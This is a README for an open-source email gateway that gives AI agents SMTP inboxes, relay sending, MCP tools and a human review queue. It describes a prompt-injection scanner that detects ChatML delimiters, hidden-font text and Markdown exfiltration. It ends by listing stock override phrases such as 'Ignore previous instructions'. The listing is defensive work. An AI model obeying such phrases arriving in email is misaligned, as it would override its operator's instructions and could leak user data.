# Open Agent Email

<div align="center">

### The Open-Source Email Gateway & Authenticated Inboxes for AI Agents

Give autonomous AI agents real two-way email inboxes, incoming SMTP reception, upstream relay sending, cryptographic SPF/DKIM/DMARC evidence, prompt-injection screening, and human-in-the-loop review gates.

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-green.svg)](https://fastapi.tiangolo.com/)
[![Next.js](https://img.shields.io/badge/Next.js-16.4-black.svg)](https://nextjs.org/)
[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v4-38bdf8.svg)](https://tailwindcss.com/)
[![MCP](https://img.shields.io/badge/MCP-JSON--RPC-purple.svg)](https://modelcontextprotocol.io/)

</div>

---

## 🌟 Key Capabilities

- **📬 Real Inbound SMTP Daemon**: Binds TCP port `2525` (dev) or `25` (production) to accept incoming emails directly from standard Mail Transfer Agents (MTAs) and external servers.
- **⚡ Upstream Outbound SMTP Relay**: Agents send real emails over the internet through upstream providers (AWS SES, Resend, SendGrid, Postmark, or Gmail SMTP with App Passwords).
- **🌐 Domains & DNS Record Verification**: Configure custom domains (e.g. `agents.yourdomain.com`) with auto-generated **MX**, **SPF**, **DKIM** (RSA), and **DMARC** records and real-time DNS status checks.
- **🧵 Standards-Compliant RFC Threading**: Preserves inbound `Message-ID`, `In-Reply-To`, and `References` headers, matches human replies to existing conversations, and sends standards-based threaded replies.
- **🛡️ Inbound Threat & Prompt-Injection Screening**: Built-in heuristic detector intercepts indirect prompt injections, hidden CSS / zero-point font tricks, ChatML delimiters (`<|im_start|>`), and Markdown data exfiltration.
- **👤 Human-in-the-Loop (HITL) Approval Queue**: Configurable policy holds sensitive or suspicious inbound and outbound emails in `pending_review` until an operator approves or quarantines them.
- **🤖 Model Context Protocol (MCP) Gateway**: Out-of-the-box MCP endpoint (`http://localhost:8000/mcp/rpc`) enables coding agents in **Cursor**, **Claude Code**, **Claude Desktop**, and **Windsurf** to read inboxes, reply, and send emails autonomously.
- **🔑 Bearer API Keys**: Manage tokens (`oae_live_...`) with fine-grained permission scopes for Python / TypeScript agent frameworks (LangChain, CrewAI, PydanticAI, OpenAI Agents SDK).

---

## 🏗️ Architecture

```text
    Real External Inboxes (Gmail / Outlook)  ·  Another AI Agent
                     │                                ▲
      Inbound SMTP   │                                │  Outbound Upstream SMTP
       (Port 2525)   ▼                                │  (AWS SES / Resend / Gmail)
  ┌───────────────────────────────────────────────────┴───────────────────────┐
  │                   Open Agent Email Gateway (FastAPI)                      │
  │                                                                           │
  │  1. Inbound SMTP Receiver (RFC 5321 / 5322)                               │
  │  2. Threat Scanner (Prompt Injection / Hidden Text / Exfiltration)       │
  │  3. Human-in-the-Loop (HITL) Review Gate                                  │
  │  4. Local Loopback Relay (Agent-to-Agent) & Upstream SMTP Relay           │
  │  5. SQLite / PostgreSQL Store with RFC Header Thread Tracking            │
  └───────────────────────────────┬───────────────────────────────────────────┘
                                  │  WebSockets / MCP / REST
                                  ▼
  ┌───────────────────────────────────────────────────────────────────────────┐
  │     Next.js Dashboard (:3000)      ·     Coding Agents (Cursor / Claude)  │
  │     • Live Inboxes & Thread View         • list_messages, get_message     │
  │     • Domains & DNS Verification         • send_message, reply_to_message │
  │     • Upstream SMTP Configuration        • list_reviews, approve_review   │
  │     • HITL Review Queue & API Keys       • WebSocket stream listener      │
  └───────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quickstart

### Prerequisites
- Python 3.11+
- Node.js 18+ & npm

### 1. Start the Server (FastAPI + Inbound SMTP)

```bash
cd server

# Create and activate virtual environment
python -m venv .venv

# On Windows:
.\.venv\Scripts\activate
# On Linux/macOS:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Configure the dashboard administrator credential (keep it secret)
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
# Encrypt SMTP relay credentials stored in the database; back this key up securely.
export SMTP_CONFIG_ENCRYPTION_KEY="$(python -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())')"

# Start server
python run.py
```

The server initializes:
- **FastAPI HTTP API & MCP**: `http://127.0.0.1:8000`
- **Interactive OpenAPI Docs**: `http://127.0.0.1:8000/docs`
- **Inbound SMTP Listener**: `127.0.0.1:2525`

For a dashboard hosted on another origin, set `CORS_ORIGINS` in `server/.env` to a JSON array of explicit origins, for example `CORS_ORIGINS='["https://mail.example.com"]'`. Wildcard origins are rejected because the API uses credentialed CORS.

### 2. Start the Client (Next.js Dashboard)

```bash
cd client
npm install
npm run dev
```

Open `http://localhost:3000` in your browser.
Choose **Connect dashboard** and enter the same `ADMIN_API_KEY` value.

---

## 🐳 Docker Deployment

Run the complete gateway stack with Docker Compose:

```bash
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
docker compose up -d --build
```

- Web Dashboard: `http://localhost:3000`
- REST API & MCP: `http://localhost:8000`
- SMTP Listener: Port `2525` (or map to `25` for direct internet MX delivery)

---

## ⚙️ Configuration & Features

### 1. Upstream SMTP Relay (`/settings`)
Set `SMTP_CONFIG_ENCRYPTION_KEY` before saving SMTP credentials. The server encrypts newly configured credentials at rest and upgrades existing plaintext credentials at startup when the key is available. Encrypted credentials require the key; startup fails if it is missing or incorrect. Back it up with the database. To rotate it, set the new key as `SMTP_CONFIG_ENCRYPTION_KEY` and the old key as `SMTP_CONFIG_ENCRYPTION_KEY_PREVIOUS`, restart so credentials are re-encrypted, then remove the previous key and restart again. The settings API only reports whether a password is configured. Without an encryption key, legacy plaintext credentials remain usable and a startup warning is logged.

Set `PUBLIC_BASE_URL` to the publicly reachable HTTPS origin where this server serves the unsubscribe page, for example `PUBLIC_BASE_URL=https://mail.example.com` (also supported in Docker Compose via `.env`). Only HTTPS on port 443 without credentials, query, or fragment is accepted; unset or invalid values safely omit unsubscribe headers and footer content. Configure a real public hostname that routes to this service; local, reserved, and loopback IP hosts are ignored. External outbound mail receives `List-Unsubscribe` and RFC 8058 one-click headers plus a visible unsubscribe link. No unsubscribe token is generated for local inbox loopback or while a message is waiting for review; a token is created when dispatch starts and its SHA-256 hash is committed before SMTP is attempted. The public page's GET is read-only so link scanners cannot unsubscribe recipients; a person must submit its confirmation form, or a mail client may send the exact RFC one-click POST. Successful opt-out creates the same inbox-scoped suppression used by the operator API, so queued mail is blocked at the final dispatch check. Tokens are opaque, scoped to one inbox and recipient, and only their hashes are stored.

### 2. Inbox Webhooks
Administrators can manage these endpoints and inspect or replay deliveries in the dashboard's **Webhooks** page, or use the REST API directly. Endpoints are scoped to one agent inbox and created with `POST /v1/webhooks` (`agent_email`, `url`, optional `enabled`); each inbox is limited to 50 endpoints. The response includes a generated `signing_secret` exactly once; store it securely. Rotate it with `POST /v1/webhooks/{endpoint_id}/rotate-secret`; the new secret is shown once, and deliveries include signatures from the new and previous secrets for a 24-hour overlap. Update the receiver during that window. A second rotation replaces the older overlap with the immediately previous secret. Webhook secrets use the same Fernet key and rotation settings as SMTP credentials, so configure `SMTP_CONFIG_ENCRYPTION_KEY` before creating endpoints. `GET /v1/webhooks` lists endpoint metadata without secrets and redacts URL query strings; `PATCH /v1/webhooks/{endpoint_id}` changes URL/enabled state and `DELETE` removes the endpoint and its delivery records. A request already in flight may finish after an endpoint is disabled.

Use the optional `events` array on create or `PATCH` to subscribe an endpoint to selected event types. Omitting it defaults to `['*']` (all events), which preserves behavior for existing endpoints; the dashboard supports selecting individual events. Subscription changes apply to newly queued events; they do not change pending or historical deliveries. Synthetic `webhook.test` events always go to the endpoint when requested, regardless of its event subscriptions.

Subscribed endpoints receive `email.received` for accepted inbound mail. Inbound mail held for review emits `email.received` only after approval releases it to the inbox. The immutable receipt payload contains message and inbox identifiers, sender, recipient, status, thread ID, and receive time. Subjects, message bodies, HTML, and attachments are never included. Messages held for human review emit `email.review_requested` when the pending review is created, followed by `email.review_approved` or `email.review_rejected` when it is resolved. For inbound approval, both `email.review_approved` and `email.received` are durably queued in the same transaction as the message/review state change. Their metadata-only payloads contain `id` (the stable delivery/event ID), `message_id`, `agent_email`, `direction`, `review_id`, resulting message `status`, and `created_at`; they exclude message content, attachment data, and scanner details. Approval results in `delivered` for inbound messages and `sending` for outbound messages; rejection results in `rejected`.

Inbound scanner findings emit `email.flagged` when a message has detected threat signals, and `email.blocked` when the scanner blocks it. A flagged message held for review can emit both `email.flagged` and `email.review_requested`; blocked messages with findings emit both `email.flagged` and `email.blocked`. These events are queued with the inbound message transaction and delivered only to enabled endpoints for that inbox. Their metadata-only payload contains `id` (stable event/delivery ID), `message_id`, `agent_email`, `direction`, resulting message `status`, message `created_at`, and bounded `threat_category`, `threat_severity`, and `threat_score`. Scanner summaries, matched content, message bodies, and attachment details are never included.

Outbound lifecycle webhooks are also available. `email.accepted_by_relay` means the configured upstream SMTP relay accepted the message; it does not mean the recipient's mailbox received it. `email.failed` is emitted only after the worker exhausts its automatic retries, and `email.delivery_unknown` means the worker lost certainty about relay acceptance (for example, after a worker lease expires during dispatch); automatic retry is stopped to avoid a duplicate send. These events are recorded transactionally with their outbound job/message status transitions and sent only to enabled endpoints for that inbox. Their payload contains only `id` (stable event/deduplication ID), `message_id`, `agent_email`, `recipient`, resulting `status`, and the message `created_at`.

For outbound mail, `email.blocked` means the recipient was on that inbox's suppression list when the worker checked immediately before dispatch; the message and outbox job become terminally `blocked`, and no local delivery or SMTP attempt is made. This is separate from the inbound scanner's `email.blocked` event described above.

Enabled endpoints subscribed to `contact.due` receive signed, metadata-only wake-ups for overdue contact engagements. A one-minute bounded sweep atomically records the due schedule it notified and queues delivery in the same transaction, so overlapping sweeps and retries do not create duplicate events. Updating the due time re-arms a notification; closed, replied, and suppressed contacts are excluded. The payload includes the event ID, inbox, engagement ID, contact ID, stage, and due timestamp. It never includes engagement notes or sends an email automatically.

Administrators can also queue a synthetic `webhook.test` event with `POST /v1/webhooks/{endpoint_id}/test`; it contains no real message ID or email content and is delivered through the same signed worker. Receivers should acknowledge or ignore that event type without treating it as an inbound message. `X-Webhook-Event-Id` is the stable event/deduplication identifier, `X-Webhook-Timestamp` is Unix seconds, and `X-Webhook-Signature` is `sha256=<hex HMAC-SHA256>`. The MAC input is the UTF-8 timestamp, a period, the event ID, a period, and the exact raw JSON request body. Verify the signature using a constant-time comparison and reject stale timestamps; deduplicate by event ID. Retries and manual replay reuse the same event ID and payload but receive a new signature timestamp.

Endpoint URLs must use HTTPS on port 443 and cannot contain credentials or fragments. At each delivery the worker resolves DNS, rejects the entire answer set if any address is private, loopback, link-local, reserved, or otherwise non-global, then opens TLS directly to a validated IP while checking the certificate against the configured hostname. Redirects are not followed. Connect and total request timeouts are bounded, only response headers (up to 16 KiB) are read, and stored errors omit URL details, response bodies, and secrets. Delivery retries use exponential backoff for up to eight attempts. Inspect bounded history with `GET /v1/webhooks/deliveries?limit=100` (maximum 200), or use cursor pagination with `GET /v1/webhooks/deliveries/page?limit=50`; the page cursor stays bound to the endpoint/status filters. Failed or previously delivered events can be manually replayed with `POST /v1/webhooks/deliveries/{event_id}/replay`. Delivered and terminal failed records are pruned after 30 days by default; configure `WEBHOOK_DELIVERY_RETENTION_DAYS` to change the retention period. Delivery is at-least-once: a timeout after the receiver processes a request can result in a retry, so receivers must deduplicate event IDs. These controls reduce SSRF exposure but do not replace outbound network egress policy at the deployment layer.

To let your agents send real emails to external people over the internet:
1. Connect the dashboard with `ADMIN_API_KEY`.
2. Choose a provider preset in **Upstream SMTP**. It fills in the host, port, and TLS mode; enter your provider-issued SMTP username and password/API token. For Amazon SES, use the SMTP endpoint for your AWS region.

3. Save the relay, send a test email, and enable outbound delivery.

These are SMTP relay presets, not provider-specific API integrations. Gmail requires an App Password; use SMTP credentials generated by SES, Resend, SendGrid, or Postmark.

Optional SES delivery feedback is available through AWS SNS. Set `SES_FEEDBACK_TOPIC_ARN` to the exact SNS topic ARN and configure SES to publish delivery, delivery delay, bounce, complaint, and reject events to that topic, with original message headers included. Subscribe the public `POST /webhooks/ses` endpoint to the topic; signed SNS subscription confirmation is handled automatically. The endpoint rejects requests unless the SNS topic ARN, signature, certificate host/region, and timestamp are valid. SES must echo the `X-Open-Agent-Email-Message-ID` header (added to outbound messages) for feedback to resolve to the exact originating inbox and message. Correlated outcomes appear on the message as `provider_delivery_status` (`delivered`, `delayed`, `bounced`, `complained`, or `rejected`) and can emit `email.delivered`, `email.delivery_delayed`, `email.bounced`, `email.complained`, or `email.failed` webhooks. A permanent bounce or complaint for that message's recipient creates an inbox-scoped suppression; transient bounces, rejects, and delivery events do not. Late delivery or delay notifications do not overwrite a previously recorded bounce, complaint, or rejection. SNS message IDs are persisted for retry deduplication. This opt-in integration currently supports SES feedback over SNS only; without the topic setting, the route is disabled and normal SMTP sending is unchanged.

Outbound message statuses distinguish local delivery from relay acceptance: `delivered` means the message reached another local agent inbox, `accepted_by_relay` means an external SMTP relay accepted it for processing, `sending` means it is queued or being dispatched, `delivery_unknown` means a worker lease expired during dispatch and SMTP acceptance cannot be determined, `blocked` means an inbox suppression prevented dispatch, and `failed` means dispatch exhausted its retries. Non-review sends and approved messages are recorded in a database-backed outbox before dispatch. The worker retries ordinary failures up to eight attempts with exponential backoff and exposes the latest error on the message. A stale processing job is marked `uncertain` and is never automatically resent because the SMTP relay may have accepted it before the worker stopped recording progress. Relay acceptance is not proof that a person received the email; later delivery feedback is available only when the SES/SNS integration above is configured.

Each inbox can maintain an explicit recipient suppression list. Read it with `GET /v1/agents/{email}/suppressions`; add an address with `POST` and `{ "email": "person@example.com", "reason": "optional note" }`; remove an entry with `DELETE /v1/agents/{email}/suppressions/{suppression_id}`. Reads require inbox read access, and add/remove require full-access scope. Addresses are trimmed and lowercased for matching. A send to a suppressed address is rejected with HTTP 422 before a message is created. The worker checks again immediately before local or SMTP dispatch, so queued, retried, and review-approved messages that become suppressed are terminally marked `blocked` without contacting SMTP. Suppressions are scoped to one inbox; they are operator-managed controls, not an unsubscribe link or proof of consent, and contacts do not affect suppression state.

Administrators can inspect bounded outbox history and manually retry failed or uncertain jobs. Retrying an uncertain job requires `confirm_duplicate_risk=true` because the SMTP relay may already have accepted the original attempt. Each manual retry records the actor, timestamp, previous status, previous attempt count, and previous error; retrieve it from `GET /v1/outbox/{job_id}/retries`. Expired worker leases are moved to `uncertain` for operator review rather than automatically reclaimed. Suppression-blocked jobs are terminal and cannot be retried from the outbox.

REST send and reply requests accept an optional `Idempotency-Key` header (1–128 characters); MCP `send_message` and `reply_to_message` accept an optional `idempotency_key` argument. Repeating a request with the same key and content returns the original message; using that key with different content returns HTTP 409. Keys are scoped to the agent inbox and stored with a request digest.

REST send and reply requests can render a saved inbox template per message by supplying `template_id` and optional JSON `template_data` instead of direct `subject`/`body_text`/`body_html` content. For example, `POST /v1/agents/{email}/messages` accepts `{ "recipient": "person@example.com", "template_id": "tpl_…", "template_data": { "name": "Sam" } }`; `POST /v1/agents/{email}/messages/{message_id}/reply` accepts the same template fields. The template must belong to that inbox. Rendering uses the same bounded data, variable syntax, output limits, missing-value behavior, HTML escaping, and subject line-break checks as template preview. A reply uses the template subject with a `Re:` prefix when needed while keeping the original thread headers. Template selection creates only that requested message; it does not start a campaign or contact list. The API rejects requests that mix a template with direct content. The Python SDK `send_message` and `reply_message` methods accept the same `template_id` and `template_data` options.

Agents can retrieve a recent verification code with `GET /v1/agents/{email}/messages/otp?since_seconds=600&wait_seconds=5` or the `get_recent_otp` MCP tool. The endpoint searches up to 50 of the inbox's newest delivered inbound messages, and can poll for at most 10 seconds. It only extracts 4–8 digit codes near verification-related language, and returns the code plus minimal message metadata; it never returns the message body. A no-match response is `{ "found": false }`. Inbox-scoped API keys can only query their own inbox.

REST and MCP send/reply calls accept attachments as `{filename, content_type, content_base64}` items. The defaults allow up to 10 files, 10 MiB per file, and 20 MiB total decoded content; configure `OUTBOUND_MAX_ATTACHMENTS`, `OUTBOUND_MAX_ATTACHMENT_BYTES`, and `OUTBOUND_MAX_TOTAL_ATTACHMENT_BYTES`. JSON base64 adds overhead and is also subject to the HTTP request-body limit.

### 2. Custom Domains & DNS (`/domains`)
1. Add your agent domain (e.g., `agents.yourdomain.com`).
2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
   - `MX`: `10 mx.yourdomain.com` pointing to your server IP.
   - `TXT (SPF)`: `v=spf1 include:_spf.openagent.dev ~all`
   - `TXT (DKIM)`: `default._domainkey` with RSA public key.
   - `TXT (DMARC)`: `_dmarc` with `p=quarantine` or `p=reject`.
3. DNS verification is not implemented yet, so the dashboard does not mark records verified automatically.

### 3. Human-in-the-Loop Review Gate (`/reviews`)
When an agent has `hitl_enabled: true` or when the Threat Scanner detects suspicious prompt injection payloads:
- Inbound mail is quarantined before reaching the agent.
- Outbound mail is held before dispatching to upstream SMTP.
- Operators review reason, threat score, and diffs in the review queue and click **Approve** or **Reject**.

`GET /v1/reviews` optionally accepts `status=pending`, `status=approved`, or `status=rejected`; other values are rejected. The MCP `list_reviews` tool uses the same status set and defaults to `pending`.

### 4. Human Handoff (`/inbox`)
Open an inbound message to view the full conversation in chronological order, including attachments on each message. Use **Hand off to a person** to forward the original email and an optional note to a teammate. Replies from the teammate to the forwarded email return to the agent inbox and stay in the original thread. The agent's outbound approval policy applies. Outbound status `accepted_by_relay` means the configured SMTP relay accepted the message; it does not confirm delivery to the human recipient. A send is shown as failed when no relay is configured or the relay rejects it.

Inbox messages track `is_read`: new inbound mail starts unread, while outbound mail starts read. Opening an inbound message in the dashboard marks it read; use the inbox **Read status** filter to focus on unread messages. Unsent dashboard replies are saved in this browser per inbox thread and restored when you return; they are not synced to another device. API clients can filter paginated results with `read_status=unread|read|all` and mark inbound mail read with `POST /v1/agents/{email}/messages/{message_id}/read` (requires write scope). Keep `read_status` unchanged when following a page cursor.

The dashboard **Contacts** page and `GET /v1/agents/{email}/contacts` provide an address book scoped to one inbox. The list accepts `limit` from 1 to 500 (default 100). Create contacts with `POST`, update with `PATCH /{contact_id}`, and delete with `DELETE /{contact_id}` under that same path. Contact records contain a normalized email address, name, optional company and notes; email and name are bounded to 255 characters and notes to 4,000. A contact email must be unique within its inbox. Read-only inbox keys can list contacts and consent history; create, update, delete, CSV import, and consent changes require full-access scope. Contact records are inert: saving or importing one never sends email, starts outreach, or records consent.

Record explicit operator-entered consent changes at `POST /v1/agents/{email}/contacts/{contact_id}/consent` with `action` (`granted` or `revoked`), required `source`, and optional `evidence` and `note` (each at most 1,000 characters). Entries are append-only and scoped to the contact and inbox. `GET` on the same path returns the current recorded state (`unknown`, `granted`, or `revoked`) and up to 100 most recent entries. This is an audit record only: it does not verify evidence, establish legal consent, alter send policy, lift suppression, or trigger outreach. Imports do not create consent records.

Import UTF-8 CSV through `POST /v1/agents/{email}/contacts/imports` with `Content-Type: text/csv`. Required header: `email`; optional headers: `name`, `company`, and `notes`. Files are limited to 1 MB and 1,000 data rows. Existing addresses, repeated addresses in the file, invalid rows, and addresses on the inbox suppression list are skipped with a per-row reason. The result includes a `batch_id`; list recent batches with `GET .../contacts/imports`. Reverse a batch with `DELETE .../contacts/imports/{batch_id}?confirm=DELETE`. Reversal deletes untouched contacts created by that batch and retains contacts edited afterward. Batch reversal does not remove suppression entries and does not imply permission to contact any imported address.

The dashboard **Follow-ups** page and `/v1/agents/{email}/engagements` track a stage (`new`, `contacted`, `waiting`, or `closed`), optional next due time, and notes for one contact in one inbox. Create with `POST` using `contact_id`, `stage`, `next_due_at` (RFC 3339), and `notes`; update with `PATCH /{engagement_id}`; list with `GET`; remove with `DELETE /{engagement_id}`. Add `?due=true` to list only overdue records that are not closed, replied, or suppressed. Scheduling a suppressed recipient returns HTTP 422, and suppression is checked again when determining due records. A DMARC-authenticated inbound message from the contact sets the server-derived `replied` flag and clears its due time; API clients cannot set or clear that fact. Due times never trigger automatic email, campaigns, or other outreach.

An enabled webhook endpoint subscribed to `contact.due` receives a metadata-only wake-up when an engagement becomes overdue. A bounded background sweep runs once per minute and claims each due schedule atomically before queueing deliveries; retries and overlapping sweeps cannot create another wake-up for that same schedule. Changing the due time re-arms notification. Closed, replied, and suppressed contacts are excluded. The payload contains the event ID, inbox, engagement and contact IDs, stage, and scheduled time; it does not include notes or send any email.

Reusable email templates are available in the dashboard's **Templates** page and through `/v1/agents/{email}/templates`. List with `GET`, create with `POST`, fetch by ID, update with `PATCH`, and delete with `DELETE`. A template has a unique name within its inbox, a subject, and at least one plain-text or HTML body. Content fields are bounded to 100,000 characters (subject to 512); `{{name}}` and nested `{{person.name}}` placeholders are supported. The read-only `POST /v1/agents/{email}/templates/preview` accepts subject/body sources and JSON `data`; `POST /{template_id}/preview` renders a saved template with JSON `data`. Both return rendered subject, text, HTML, and referenced variable names without saving or sending anything. Missing values render as empty strings; interpolation in HTML is escaped. Preview and send-time data are limited to 16 KB and bounded in depth and item count. Read-only keys can list, fetch, and preview; create, update, and delete require full-access scope. In inbox compose and reply, choose a saved template for the selected inbox, enter JSON data, and preview the rendered subject and body before sending; clearing the selection returns to direct editing and preserves the editor's text. The first-party Python SDK exposes template CRUD, preview, and per-message template sending. Templates cannot send by themselves, create audiences, or start campaigns.

The dashboard reply and compose editors support saved response snippets. Save the current text with a name, then insert or delete snippets from the editor. Snippets are stored in this browser's local storage per inbox; they are not uploaded, shared across browsers, or available through the API. Inserting replaces the editor's current text. Snippets provide plain-text reuse only; compose recipient and subject, and reply thread headers, continue to come from the normal send flow.

Inbound SMTP evaluates SPF against the connecting peer IP and SMTP envelope sender, verifies up to five DKIM signatures from the original message bytes, and evaluates DMARC against the single RFC 5322 From domain. The message stores bounded authentication evidence with evaluation time, peer/envelope identities, From header, passing DKIM domains, and each result. Identical SMTP retries are deduplicated per inbox using a digest of the raw message and envelope sender. DMARC discovery follows the RFC 9989 DNS tree walk, and SPF/DKIM identifiers are checked using the published strict or relaxed alignment mode. DNS lookups are bounded; SPF results include `softfail`, `permerror`, and `temperror`, and DMARC reports `temperror` when DNS makes the result inconclusive. DMARC status is authentication evidence; it does not currently enforce the sender's requested reject or quarantine policy on SMTP delivery.

Inbound MIME attachments are stored with their message and appear in the inbox with authenticated download links. Human handoff forwards those files along with the original message. The SMTP receiver defaults to a 20 MiB raw-message limit, 10 MiB per attachment, and 10 attachments per message; set `SMTP_MAX_MESSAGE_BYTES`, `SMTP_MAX_ATTACHMENT_BYTES`, and `SMTP_MAX_ATTACHMENTS` to adjust these bounds. EHLO advertises the configured SIZE limit and 8BITMIME; MAIL/RCPT parsing accepts ESMTP path parameters while validating the actual inbox address. Configure `SMTP_TLS_CERT_FILE` and `SMTP_TLS_KEY_FILE` to advertise STARTTLS; set `SMTP_REQUIRE_STARTTLS=true` to refuse mail transfer unless TLS is active. Idle SMTP reads time out after 60 seconds, message input has a 5-minute limit, and at most 100 SMTP sessions run concurrently; configure these with `SMTP_READ_TIMEOUT_SECONDS`, `SMTP_DATA_TIMEOUT_SECONDS`, `SMTP_MAX_CONNECTIONS`, and `SMTP_LINE_LIMIT_BYTES`.

`/health` reports process liveness. `/ready` returns HTTP 200 only when the database, inbound SMTP listener, outbound worker, and webhook worker are available; it also reports pending outbox and webhook counts. Use `/ready` for deployment readiness checks.

Administrators can inspect recent outbox jobs at `GET /v1/outbox` (filter with `status` including `uncertain` or `blocked`, and bound `limit` to 200). For older jobs, use cursor pagination with `GET /v1/outbox/page?limit=50`; the optional `status` filter accepts `pending`, `processing`, `complete`, `failed`, `uncertain`, or `blocked`. Keep the filter unchanged when following `next_cursor`. Retry a failed job with `POST /v1/outbox/{job_id}/retry`; retry an uncertain job with `POST /v1/outbox/{job_id}/retry?confirm_duplicate_risk=true`. Retry history records the administrator identity, time, prior state, attempt count, and error.

REST, MCP, and public unsubscribe requests are limited to 120 per socket peer IP per rolling minute by default. Configure `API_RATE_LIMIT_REQUESTS`, `API_RATE_LIMIT_WINDOW_SECONDS`, and `API_RATE_LIMIT_MAX_CLIENTS` for the single-process in-memory limiter. It uses the direct socket peer address and does not trust `X-Forwarded-For`; deployments behind a proxy should enforce client-aware limits at that proxy as well.

REST inbox listings are capped at 500 messages and review lists at 200; MCP message and review tools accept bounded limits up to 100. For larger inboxes, `GET /v1/agents/{email}/messages/page` provides stable cursor pagination (1–100 items per page), optional direction, read-status, and delivery-status filters, and case-insensitive sender/subject search using `q`. Delivery status accepts `delivered`, `accepted_by_relay`, `sending`, `delivery_unknown`, `pending_review`, `rejected`, `blocked`, or `failed`. Follow the returned `next_cursor` with the same filters until it is `null`; the original list endpoint remains available for compatibility.

The HTTP server binds to `127.0.0.1:8000` by default; Docker Compose sets `HOST=0.0.0.0` inside the container so the published port and dashboard can reach it. The SMTP listener also defaults to loopback locally; Compose sets `SMTP_HOST=0.0.0.0` and publishes port `2525`. Configure `HOST`, `PORT`, `SMTP_HOST`, and `SMTP_PORT` for other deployments. Uvicorn caps concurrent connections/tasks at 200 and closes idle keepalive connections after 5 seconds by default; set `HTTP_MAX_CONCURRENCY` and `HTTP_KEEPALIVE_TIMEOUT_SECONDS` to adjust those bounds. HTTP request bodies are capped at 15 MiB by default; configure `HTTP_MAX_REQUEST_BYTES`. Requests over the concurrency cap receive HTTP 503 and oversized bodies receive HTTP 413.

SQLite is the default for a single-process self-hosted setup. PostgreSQL can be selected with an async SQLAlchemy URL such as `postgresql+asyncpg://user:password@db-host:5432/open_agent_email`; `asyncpg` is included in the server requirements. Database migrations are currently additive startup updates; Alembic-managed migration history is still planned.

---

## 🤖 Coding Agent Integration (MCP)

Connect any Model Context Protocol compatible client to control agent inboxes.

### Cursor Setup
Create an inbox and an API key for it in **API Keys**. Then add to `.cursor/mcp.json` (or `~/.cursor/mcp.json`), replacing the placeholder with the generated key:

API keys expire after 90 days by default. Choose 30 days, 90 days, one year, or no expiration when creating a key. Keys can be read-only, read/send, or review-only; review-only keys are limited to the assigned inbox's review queue and review decisions. Expired keys are rejected automatically; revoke a key at any time from the dashboard.

```json
{
  "mcpServers": {
    "open-agent-email": {
                    "url": "http://127.0.0.1:8000/mcp/rpc",
                    "headers": {
                        "Authorization": "Bearer PASTE_AGENT_API_KEY"
                    }
    }
  }
}
```

### Claude Code Setup
```bash
claude mcp add --transport http open-agent-email http://127.0.0.1:8000/mcp/rpc --header "Authorization: Bearer PASTE_AGENT_API_KEY"
```

### Available MCP Tools
| Tool | Description |
| :--- | :--- |
| `list_agents` | Lists all configured agent inboxes and their operational status. |
| `list_messages` | Fetches inbound and outbound messages with status and threat scores. |
| `get_message` | Retrieves full RFC headers, body text, HTML, and security verification verdicts. |
| `get_recent_otp` | Finds a recent contextual verification code from delivered inbound mail in the specified inbox. |
| `send_message` | Dispatches outbound email from the agent address (relays via upstream SMTP). |
| `reply_to_message` | Replies in-thread preserving `In-Reply-To` and `References`. |
| `forward_to_human` | Forwards the original message and optional context to a human teammate. Outbound approval rules still apply. |
| `list_reviews` | Lists emails held in the Human-in-the-Loop approval queue. |
| `approve_review` | Approves a held email and triggers delivery. |
| `reject_review` | Rejects and quarantines an email. |

**67 tools in total** (`GET /mcp/tools` returns every schema). Beyond the table above, grouped by the credential each needs:

- **Any credential:** `whoami`.
- **Inbox read scope** (`read_only` or `full_access` key for that inbox, or admin): `list_conversations`, `get_conversation`, `get_message_lifecycle`, `get_agent_metrics`, `get_protection`, `get_attachment` (metadata), `get_attachment_data` (base64, 5 MB cap), `list_templates`, `get_template`, `preview_template`, `list_contacts`, `get_contact_consent`, `list_outreach_contacts`, `list_suppressions`.
- **Inbox write scope** (`full_access` key for that inbox, or admin): `update_message_labels`, `delete_message`, `restore_message`, `create_template`, `update_template`, `delete_template`, `create_contact`, `update_contact`, `delete_contact`, `import_contacts` (CSV text), `delete_contact_import`, `record_contact_consent`, `set_outreach_contact`, `delete_outreach_contact`, `create_agent_suppression`, `delete_agent_suppression`. `send_message` and `reply_to_message` also accept `send_at`.
- **Administrator only:** `create_agent`, `get_agent`, `update_agent`, `delete_agent`, `update_protection`, `list_webhooks`, `get_webhook`, `create_webhook`, `update_webhook`, `delete_webhook`, `rotate_webhook_secret`, `test_webhook`, `list_webhook_deliveries`, `list_events`, `get_event`, `redeliver_event`, `list_api_keys`, `create_api_key`, `delete_api_key`, `list_domains`, `register_domain`, `verify_domain`, `delete_domain`, `get_account_metrics`, `list_outbox`, `retry_outbox_job`.
- **Reviewer keys** can call only `list_reviews`, `approve_review`, `reject_review` and `whoami`.

Webhook signing secrets and newly created API keys are returned once, in the response that creates or rotates them; reads never include them. Each tool runs the same code as its REST route, so validation, idempotency, suppression checks and approval rules are identical.

---

A first-party TypeScript SDK (`@open-agent-email/sdk`, zero runtime dependencies) lives in [sdks/typescript](sdks/typescript): typed REST client, cursor iterators, webhook signature verification, and a real-time `listen()` stream.

## 📡 Python SDK & WebSockets Example

Connect an autonomous agent to stream incoming emails over WebSockets without opening firewall ports or using ngrok:

```python
import asyncio
import websockets
import json

AGENT_EMAIL = "assistant@agents.local"
API_KEY = "paste_the_key_for_this_inbox"
WS_URL = f"ws://127.0.0.1:8000/v1/agents/{AGENT_EMAIL}/ws"

async def listen():
    async with websockets.connect(WS_URL, additional_headers={"Authorization": f"Bearer {API_KEY}"}) as ws:
        print(f"Connected to live stream for {AGENT_EMAIL}")
        while True:
            msg = await ws.recv()
            event = json.loads(msg)
            if event.get("event") == "email.received":
                data = event["data"]
                print(f"New email from: {data['sender']} - Subject: {data['subject']}")

asyncio.run(listen())
```

---

## 🔒 Threat Screening Engine

The built-in scanner guards agent inboxes against:
- **Direct Instruction Overrides**: `Ignore previous instructions`, `Disregard system prompts`, `System Override`.
